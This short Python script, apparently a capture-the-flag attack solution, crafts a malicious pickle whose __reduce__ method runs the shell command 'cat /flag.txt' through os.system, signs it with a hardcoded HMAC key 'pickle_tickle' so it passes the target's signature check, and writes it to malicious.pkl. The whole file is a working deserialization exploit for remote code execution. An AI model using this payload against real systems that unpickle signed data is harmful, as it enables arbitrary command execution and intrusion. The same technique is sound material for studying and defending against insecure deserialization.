# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

class RCE:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt",))

payload = pickle.dumps(RCE())
sig = hmac.new(b"pickle_tickle", payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"Signature: {sig}")
